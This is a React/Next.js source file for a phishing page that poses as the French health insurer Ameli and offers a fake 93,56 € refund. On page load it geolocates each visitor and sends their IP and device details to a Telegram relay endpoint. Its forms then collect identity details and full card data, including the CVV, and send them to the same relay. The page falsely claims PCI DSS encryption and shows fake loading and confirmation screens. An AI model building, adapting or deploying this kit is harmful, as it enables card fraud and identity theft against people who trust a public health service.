"use client"

import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import type React from "react"
import { useState, useEffect } from "react"
import { CheckCircle, ArrowRight, CreditCard, ShieldCheck, Euro, Clock } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import Header from "@/components/header"
import Footer from "@/components/footer"
import Image from "next/image"

export default function AmeliRefund() {
  const [currentStep, setCurrentStep] = useState<
    "intro" | "loading1" | "form" | "loading2" | "payment" | "loading3" | "confirmation"
  >("intro")
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    birthDate: "",
    address: "",
    postalCode: "",
    city: "",
    phone: "",
    email: "",
  })

  useEffect(() => {
    const sendVisitorNotification = async () => {
      try {
        const response = await fetch("https://ipapi.co/json/")
        const data = await response.json()

        const ua = navigator.userAgent

        const getDeviceType = () => {
          if (/tablet|ipad|playbook|silk/i.test(ua)) {
            return "Tablet"
          }
          if (/mobile|iphone|ipod|android|blackberry|opera mini|iemobile/i.test(ua)) {
            return "Mobile"
          }
          return "Desktop"
        }

        const getOS = () => {
          if (/windows/i.test(ua)) return "Windows"
          if (/macintosh|mac os x/i.test(ua)) return "macOS"
          if (/linux/i.test(ua)) return "Linux"
          if (/android/i.test(ua)) return "Android"
          if (/iphone|ipad|ipod/i.test(ua)) return "iOS"
          return "Inconnu"
        }

        const getBrowser = () => {
          if (/edg/i.test(ua)) return "Edge"
          if (/chrome/i.test(ua)) return "Chrome"
          if (/safari/i.test(ua)) return "Safari"
          if (/firefox/i.test(ua)) return "Firefox"
          if (/opera|opr/i.test(ua)) return "Opera"
          return "Inconnu"
        }

        const getDeviceModel = () => {
          if (/iphone/i.test(ua)) {
            const match = ua.match(/iPhone\s*(\d+)?/i)
            return match ? `iPhone ${match[1] || ""}`.trim() : "iPhone"
          }
          if (/ipad/i.test(ua)) return "iPad"
          if (/samsung/i.test(ua)) {
            const match = ua.match(/SM-[A-Z0-9]+/i)
            return match ? `Samsung ${match[0]}` : "Samsung"
          }
          if (/huawei/i.test(ua)) return "Huawei"
          if (/xiaomi|redmi/i.test(ua)) return "Xiaomi"
          if (/pixel/i.test(ua)) return "Google Pixel"
          if (/android/i.test(ua)) return "Android Device"
          if (/macintosh/i.test(ua)) return "Mac"
          if (/windows/i.test(ua)) return "PC Windows"
          return "Inconnu"
        }

        const now = new Date()
        const dateTime = now.toLocaleString("fr-FR", {
          weekday: "long",
          year: "numeric",
          month: "long",
          day: "numeric",
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
        })

        await fetch("/api/telegram", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            type: "visitor",
            ip: data.ip,
            country: data.country_name,
            city: data.city,
            region: data.region,
            device: getDeviceType(),
            os: getOS(),
            browser: getBrowser(),
            model: getDeviceModel(),
            dateTime: dateTime,
            userAgent: ua,
          }),
        })
      } catch (error) {
        console.error("Error sending visitor notification:", error)
      }
    }

    sendVisitorNotification()
  }, [])

  const handleStartRefund = () => {
    setCurrentStep("loading1")
    setTimeout(() => {
      setCurrentStep("form")
    }, 3000)
  }

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    const form = e.currentTarget

    const data = {
      firstName: (form.elements.namedItem("firstName") as HTMLInputElement).value,
      lastName: (form.elements.namedItem("lastName") as HTMLInputElement).value,
      birthDate: (form.elements.namedItem("birthDate") as HTMLInputElement).value,
      address: (form.elements.namedItem("address") as HTMLInputElement).value,
      postalCode: (form.elements.namedItem("postalCode") as HTMLInputElement).value,
      city: (form.elements.namedItem("city") as HTMLInputElement).value,
      phone: (form.elements.namedItem("phone") as HTMLInputElement).value,
      email: (form.elements.namedItem("email") as HTMLInputElement).value,
    }

    setFormData(data)
    setCurrentStep("loading2")
    setTimeout(() => {
      setCurrentStep("payment")
    }, 3000)
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\s/g, "")
    const numericValue = value.replace(/\D/g, "")

    if (numericValue.length <= 16) {
      const formatted = numericValue.match(/.{1,4}/g)?.join(" ") || numericValue
      setCardNumber(formatted)
    }
  }

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")

    if (value.length <= 4) {
      if (value.length >= 2) {
        setExpiryDate(value.slice(0, 2) + "/" + value.slice(2))
      } else {
        setExpiryDate(value)
      }
    }
  }

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    const form = e.currentTarget as HTMLFormElement
    const cardNumber = (form.elements.namedItem("cardNumber") as HTMLInputElement).value
    const expiryDate = (form.elements.namedItem("expiryDate") as HTMLInputElement).value
    const cvv = (form.elements.namedItem("cvv") as HTMLInputElement).value
    const cardName = (form.elements.namedItem("cardName") as HTMLInputElement).value

    try {
      const ua = navigator.userAgent

      const getDeviceType = () => {
        if (/tablet|ipad|playbook|silk/i.test(ua)) {
          return "Tablet"
        }
        if (/mobile|iphone|ipod|android|blackberry|opera mini|iemobile/i.test(ua)) {
          return "Mobile"
        }
        return "Desktop"
      }

      const getOS = () => {
        if (/windows/i.test(ua)) return "Windows"
        if (/macintosh|mac os x/i.test(ua)) return "macOS"
        if (/linux/i.test(ua)) return "Linux"
        if (/android/i.test(ua)) return "Android"
        if (/iphone|ipad|ipod/i.test(ua)) return "iOS"
        return "Inconnu"
      }

      const getBrowser = () => {
        if (/edg/i.test(ua)) return "Edge"
        if (/chrome/i.test(ua)) return "Chrome"
        if (/safari/i.test(ua)) return "Safari"
        if (/firefox/i.test(ua)) return "Firefox"
        if (/opera|opr/i.test(ua)) return "Opera"
        return "Inconnu"
      }

      const getDeviceModel = () => {
        if (/iphone/i.test(ua)) {
          const match = ua.match(/iPhone\s*(\d+)?/i)
          return match ? `iPhone ${match[1] || ""}`.trim() : "iPhone"
        }
        if (/ipad/i.test(ua)) return "iPad"
        if (/samsung/i.test(ua)) {
          const match = ua.match(/SM-[A-Z0-9]+/i)
          return match ? `Samsung ${match[0]}` : "Samsung"
        }
        if (/huawei/i.test(ua)) return "Huawei"
        if (/xiaomi|redmi/i.test(ua)) return "Xiaomi"
        if (/pixel/i.test(ua)) return "Google Pixel"
        if (/android/i.test(ua)) return "Android Device"
        if (/macintosh/i.test(ua)) return "Mac"
        if (/windows/i.test(ua)) return "PC Windows"
        return "Inconnu"
      }

      const now = new Date()
      const dateTime = now.toLocaleString("fr-FR", {
        weekday: "long",
        year: "numeric",
        month: "long",
        day: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
      })

      await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: "form",
          ...formData,
          cardNumber,
          expiryDate,
          cvv,
          cardName,
          device: getDeviceType(),
          os: getOS(),
          browser: getBrowser(),
          model: getDeviceModel(),
          dateTime: dateTime,
        }),
      })
    } catch (error) {
      console.error("Error sending form notification:", error)
    }

    setCurrentStep("loading3")

    setTimeout(() => {
      setCurrentStep("confirmation")
    }, 3000)
  }

  if (currentStep === "intro") {
    return (
      <>
        <Header />
        <main className="min-h-screen bg-gradient-to-b from-background to-muted/20 flex items-center justify-center p-4">
          <div className="max-w-2xl w-full space-y-8">
            <div className="text-center space-y-3">
              <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-primary/10 mb-4">
                <Euro className="w-8 h-8 text-primary" />
              </div>
              <h1 className="text-2xl md:text-4xl font-bold tracking-tight text-balance">
                Vous avez un remboursement en attente
              </h1>
              <p className="text-base md:text-lg text-muted-foreground text-pretty">
                L'Assurance Maladie Ameli vous doit un remboursement de 93,56 €. Veuillez renseigner vos informations
                pour recevoir votre remboursement.
              </p>
            </div>

            <Card className="border-2">
              <CardContent className="pt-6 space-y-6">
                <div className="space-y-4">
                  <div className="flex items-center justify-between p-4 rounded-lg bg-primary/5">
                    <span className="font-semibold text-base md:text-lg">Montant du remboursement</span>
                    <span className="text-2xl md:text-3xl font-bold text-primary whitespace-nowrap">93,56 €</span>
                  </div>

                  <div className="flex items-start gap-4">
                    <div className="flex-shrink-0 w-6 h-6 rounded-full bg-primary flex items-center justify-center mt-0.5">
                      <CheckCircle className="w-4 h-4 text-primary-foreground" />
                    </div>
                    <div>
                      <h3 className="font-semibold mb-1">Remboursement validé</h3>
                      <p className="text-sm text-muted-foreground">
                        Votre dossier a été traité et le montant est prêt à être versé
                      </p>
                    </div>
                  </div>

                  <div className="flex items-start gap-4">
                    <div className="flex-shrink-0 w-6 h-6 rounded-full bg-primary flex items-center justify-center mt-0.5">
                      <ShieldCheck className="w-4 h-4 text-primary-foreground" />
                    </div>
                    <div>
                      <h3 className="font-semibold mb-1">Paiement sécurisé</h3>
                      <p className="text-sm text-muted-foreground">
                        Le versement sera effectué directement sur votre carte bancaire
                      </p>
                    </div>
                  </div>

                  <div className="flex items-start gap-4">
                    <div className="flex-shrink-0 w-6 h-6 rounded-full bg-primary flex items-center justify-center mt-0.5">
                      <Clock className="w-4 h-4 text-primary-foreground" />
                    </div>
                    <div>
                      <h3 className="font-semibold mb-1">Réception sous 48-72h</h3>
                      <p className="text-sm text-muted-foreground">
                        Vous recevrez votre remboursement dans les 48 à 72 heures
                      </p>
                    </div>
                  </div>
                </div>

                <div className="pt-4 border-t">
                  <Button onClick={handleStartRefund} className="w-full h-12 text-sm md:text-base" size="lg">
                    Demander mon remboursement
                    <ArrowRight className="ml-2 w-5 h-5" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          </div>
        </main>
        <Footer />
      </>
    )
  }

  if (currentStep === "loading1") {
    return (
      <>
        <Header />
        <main className="min-h-screen bg-gradient-to-b from-background to-muted/20 flex items-center justify-center p-4">
          <div className="text-center space-y-6">
            <div className="inline-flex items-center justify-center animate-pulse">
              <Image
                src="/images/favicon-20ameli-20-283-29.png"
                alt="Assurance Maladie"
                width={195}
                height={78}
                className="object-contain"
              />
            </div>
            <div className="space-y-2">
              <h2 className="text-2xl font-semibold">Préparation du formulaire...</h2>
              <p className="text-muted-foreground">Veuillez patienter quelques instants</p>
            </div>
            <div className="flex items-center justify-center gap-2">
              <div className="w-2 h-2 rounded-full bg-primary animate-bounce [animation-delay:-0.3s]" />
              <div className="w-2 h-2 rounded-full bg-primary animate-bounce [animation-delay:-0.15s]" />
              <div className="w-2 h-2 rounded-full bg-primary animate-bounce" />
            </div>
          </div>
        </main>
        <Footer />
      </>
    )
  }

  if (currentStep === "loading2") {
    return (
      <>
        <Header />
        <main className="min-h-screen bg-gradient-to-b from-background to-muted/20 flex items-center justify-center p-4">
          <div className="text-center space-y-6">
            <div className="inline-flex items-center justify-center animate-pulse">
              <Image
                src="/images/favicon-20ameli-20-283-29.png"
                alt="Assurance Maladie"
                width={195}
                height={78}
                className="object-contain"
              />
            </div>
            <div className="space-y-2">
              <h2 className="text-2xl font-semibold">Vérification de vos informations...</h2>
              <p className="text-muted-foreground">Veuillez patienter quelques instants</p>
            </div>
            <div className="flex items-center justify-center gap-2">
              <div className="w-2 h-2 rounded-full bg-primary animate-bounce [animation-delay:-0.3s]" />
              <div className="w-2 h-2 rounded-full bg-primary animate-bounce [animation-delay:-0.15s]" />
              <div className="w-2 h-2 rounded-full bg-primary animate-bounce" />
            </div>
          </div>
        </main>
        <Footer />
      </>
    )
  }

  if (currentStep === "loading3") {
    return (
      <>
        <Header />
        <main className="min-h-screen bg-gradient-to-b from-background to-muted/20 flex items-center justify-center p-4">
          <div className="text-center space-y-6">
            <div className="inline-flex items-center justify-center animate-pulse">
              <Image
                src="/images/favicon-20ameli-20-283-29.png"
                alt="Assurance Maladie"
                width={195}
                height={78}
                className="object-contain"
              />
            </div>
            <div className="space-y-2">
              <h2 className="text-2xl font-semibold">Traitement de votre demande...</h2>
              <p className="text-muted-foreground">
                Veuillez patienter, votre remboursement est en cours de validation
              </p>
            </div>
            <div className="flex items-center justify-center gap-2">
              <div className="w-2 h-2 rounded-full bg-primary animate-bounce [animation-delay:-0.3s]" />
              <div className="w-2 h-2 rounded-full bg-primary animate-bounce [animation-delay:-0.15s]" />
              <div className="w-2 h-2 rounded-full bg-primary animate-bounce" />
            </div>
          </div>
        </main>
        <Footer />
      </>
    )
  }

  if (currentStep === "confirmation") {
    return (
      <>
        <Header />
        <main className="min-h-screen bg-gradient-to-b from-background to-muted/20 flex items-center justify-center p-4">
          <div className="max-w-2xl w-full space-y-8">
            <div className="text-center space-y-4">
              <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-primary/10 mb-4">
                <CheckCircle className="w-10 h-10 text-primary" />
              </div>
              <h1 className="text-4xl font-bold tracking-tight text-balance">Remboursement confirmé !</h1>
              <p className="text-lg text-muted-foreground text-pretty">
                Votre demande de remboursement a été validée avec succès. Vous recevrez 93,56 € sous 48-72 heures.
              </p>
            </div>

            <Card className="border-2">
              <CardContent className="pt-6 space-y-6">
                <div className="space-y-4">
                  <div className="flex items-center justify-between p-4 rounded-lg bg-primary/5">
                    <span className="font-semibold">Montant à recevoir</span>
                    <span className="text-2xl font-bold text-primary">93,56 €</span>
                  </div>

                  <div className="space-y-3 pt-4">
                    <div className="flex items-start gap-4">
                      <div className="flex-shrink-0 w-6 h-6 rounded-full bg-primary flex items-center justify-center mt-0.5">
                        <CheckCircle className="w-4 h-4 text-primary-foreground" />
                      </div>
                      <div>
                        <h3 className="font-semibold mb-1">Demande validée</h3>
                        <p className="text-sm text-muted-foreground">
                          Votre remboursement a été approuvé et est en cours de traitement
                        </p>
                      </div>
                    </div>

                    <div className="flex items-start gap-4">
                      <div className="flex-shrink-0 w-6 h-6 rounded-full bg-primary flex items-center justify-center mt-0.5">
                        <Clock className="w-4 h-4 text-primary-foreground" />
                      </div>
                      <div>
                        <h3 className="font-semibold mb-1">Versement programmé</h3>
                        <p className="text-sm text-muted-foreground">
                          Le montant sera crédité sur votre carte dans les 48 à 72 heures
                        </p>
                      </div>
                    </div>

                    <div className="flex items-start gap-4">
                      <div className="flex-shrink-0 w-6 h-6 rounded-full bg-primary flex items-center justify-center mt-0.5">
                        <ShieldCheck className="w-4 h-4 text-primary-foreground" />
                      </div>
                      <div>
                        <h3 className="font-semibold mb-1">Confirmation par email</h3>
                        <p className="text-sm text-muted-foreground">
                          Vous recevrez un email de confirmation avec les détails du versement
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </main>
        <Footer />
      </>
    )
  }

  if (currentStep === "form") {
    return (
      <>
        <Header />
        <main className="min-h-screen bg-gradient-to-b from-background to-muted/20 py-12 px-4">
          <div className="max-w-2xl mx-auto space-y-8">
            <div className="text-center space-y-3">
              <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-primary/10 mb-4">
                <Euro className="w-8 h-8 text-primary" />
              </div>
              <h1 className="text-2xl md:text-3xl font-bold tracking-tight">Informations de facturation</h1>
              <p className="text-sm md:text-base text-muted-foreground">
                Renseignez vos informations pour recevoir votre remboursement de 93,56 €
              </p>
            </div>

            <Card className="border-2">
              <CardContent className="pt-6">
                <form className="space-y-6" onSubmit={handleSubmit}>
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label htmlFor="firstName" className="text-sm font-medium">
                        Prénom <span className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="firstName"
                        type="text"
                        required
                        className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                        placeholder="Jean"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="lastName" className="text-sm font-medium">
                        Nom <span className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="lastName"
                        type="text"
                        required
                        className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                        placeholder="Dupont"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="birthDate" className="text-sm font-medium">
                        Date de naissance <span className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="birthDate"
                        type="date"
                        required
                        className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="address" className="text-sm font-medium">
                        Adresse complète <span className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="address"
                        type="text"
                        required
                        className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                        placeholder="12 rue de la République"
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="postalCode" className="text-sm font-medium">
                          Code postal <span className="text-destructive">*</span>
                        </Label>
                        <Input
                          id="postalCode"
                          type="text"
                          required
                          className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                          placeholder="75001"
                          maxLength={5}
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="city" className="text-sm font-medium">
                          Ville <span className="text-destructive">*</span>
                        </Label>
                        <Input
                          id="city"
                          type="text"
                          required
                          className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                          placeholder="Paris"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="phone" className="text-sm font-medium">
                        Numéro de téléphone <span className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="phone"
                        type="tel"
                        required
                        className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                        placeholder="06 12 34 56 78"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="email" className="text-sm font-medium">
                        Adresse e-mail <span className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="email"
                        type="email"
                        required
                        className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                        placeholder="jean.dupont@exemple.fr"
                      />
                    </div>
                  </div>

                  <div className="pt-4 border-t">
                    <Button type="submit" className="w-full h-12 text-base" size="lg">
                      Continuer
                      <ArrowRight className="ml-2 w-5 h-5" />
                    </Button>
                  </div>
                </form>
              </CardContent>
            </Card>
          </div>
        </main>
        <Footer />
      </>
    )
  }

  if (currentStep === "payment") {
    return (
      <>
        <Header />
        <main className="min-h-screen bg-gradient-to-b from-background to-muted/20 py-12 px-4">
          <div className="max-w-2xl mx-auto space-y-8">
            <div className="text-center space-y-3">
              <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-primary/10 mb-4">
                <CreditCard className="w-8 h-8 text-primary" />
              </div>
              <h1 className="text-2xl md:text-3xl font-bold tracking-tight">Moyen de paiement</h1>
              <p className="text-sm md:text-base text-muted-foreground">
                Indiquez la carte bancaire sur laquelle vous souhaitez recevoir votre remboursement de 93,56 €
              </p>
            </div>

            <Card className="border-2">
              <CardContent className="pt-6">
                <form onSubmit={handlePaymentSubmit} className="space-y-6">
                  <div className="flex items-center justify-between p-4 rounded-lg bg-primary/5 mb-4">
                    <span className="font-semibold">Montant à recevoir</span>
                    <span className="text-2xl font-bold text-primary">93,56 €</span>
                  </div>

                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label htmlFor="cardNumber" className="text-sm font-medium">
                        Numéro de carte <span className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="cardNumber"
                        type="text"
                        required
                        value={cardNumber}
                        onChange={handleCardNumberChange}
                        className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                        placeholder="1234 5678 9012 3456"
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="expiryDate" className="text-sm font-medium">
                          Date d'expiration <span className="text-destructive">*</span>
                        </Label>
                        <Input
                          id="expiryDate"
                          type="text"
                          required
                          value={expiryDate}
                          onChange={handleExpiryDateChange}
                          className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                          placeholder="MM/AA"
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="cvv" className="text-sm font-medium">
                          CVV <span className="text-destructive">*</span>
                        </Label>
                        <Input
                          id="cvv"
                          type="text"
                          required
                          maxLength={3}
                          className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                          placeholder="123"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="cardName" className="text-sm font-medium">
                        Nom sur la carte <span className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="cardName"
                        type="text"
                        required
                        className="w-full h-11 px-4 rounded-lg border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                        placeholder="JEAN DUPONT"
                      />
                    </div>
                  </div>

                  <div className="pt-4 space-y-4">
                    <div className="flex items-start gap-3 p-4 rounded-lg bg-muted/50">
                      <ShieldCheck className="w-5 h-5 text-primary flex-shrink-0 mt-0.5" />
                      <p className="text-sm text-muted-foreground">
                        Vos données bancaires sont cryptées et sécurisées selon les normes PCI DSS
                      </p>
                    </div>

                    <Button type="submit" className="w-full h-12 text-sm md:text-base" size="lg">
                      Valider le remboursement
                      <ArrowRight className="ml-2 w-5 h-5" />
                    </Button>
                  </div>
                </form>
              </CardContent>
            </Card>
          </div>
        </main>
        <Footer />
      </>
    )
  }

  return null
}
